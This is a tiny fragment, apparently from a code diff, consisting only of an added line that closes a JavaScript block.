+});
 
